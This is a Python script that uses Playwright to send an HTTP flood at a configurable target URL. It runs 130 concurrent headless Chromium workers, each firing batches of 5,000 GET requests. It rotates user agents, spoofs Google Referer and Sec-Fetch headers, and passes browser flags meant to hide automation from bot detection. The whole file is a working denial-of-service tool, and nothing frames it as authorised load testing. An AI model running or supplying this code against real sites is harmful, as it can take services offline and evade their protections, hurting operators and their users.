import asyncio
import random
import time
import os
from playwright.async_api import async_playwright

TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
DURATION = int(os.getenv("DURATION", "20"))
CONCURRENCY = int(os.getenv("CONCURRENCY", "130"))
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "5000"))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
]
ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja,en;q=0.8"]

success = 0
fail = 0
status_count = {}

async def flood(playwright, worker_id):
    global success, fail, status_count

    ua = random.choice(USER_AGENTS)
    lang = random.choice(ACCEPT_LANG)

    browser = await playwright.chromium.launch(
        headless=True,
        args=[
            "--disable-web-security",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-setuid-sandbox",
            "--disable-software-rasterizer",
            "--disable-extensions",
            "--disable-plugins",
            "--disable-images",
            "--disable-javascript",
            "--disable-javascript-harmony-promises",
            "--disable-wake-on-wifi",
            "--disable-3d-apis",
            "--disable-gl-drawing-for-tests",
            "--disable-gpu",
            "--disable-background-timer-throttling",
            "--disable-renderer-backgrounding",
            "--disable-field-trial-config",
            "--disable-ipc-flooding-protection",
            "--enable-automation",
            "--password-store=basic",
            "--use-mock-keychain",
            "--single-process"
        ]
    )
    context = await browser.new_context(
        user_agent=ua,
        extra_http_headers={
            "Accept-Language": lang,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        },
        ignore_https_errors=True,
        java_script_enabled=False
    )

    start = time.time()
    while time.time() - start < DURATION:
        tasks = []
        for _ in range(REQ_PER_LOOP):
            tasks.append(context.request.get(
                TARGET_URL, 
                timeout=10000,
                headers={
                    "Referer": "https://www.google.com/",
                    "DNT": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "cross-site"
                }
            ))
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in results:
            if isinstance(res, Exception):
                fail += 1
                status_count["exception"] = status_count.get("exception", 0) + 1
            else:
                if res.ok:
                    success += 1
                    status_count[res.status] = status_count.get(res.status, 0) + 1
                else:
                    fail += 1
                    status_count[res.status] = status_count.get(res.status, 0) + 1

    await browser.close()

async def execute():
    async with async_playwright() as p:
        tasks = [flood(p, i) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)

    total = success + fail
    print(f"\n=== Flood Result ===")
    print(f"Total requests: {total}")
    print(f"Success (2xx): {success}")
    print(f"Fail/Blocked: {fail}")
    print(f"RPS ~ {total / DURATION:.2f}")
    print("Status breakdown:", status_count)

if __name__ == "__main__":
    asyncio.run(execute())
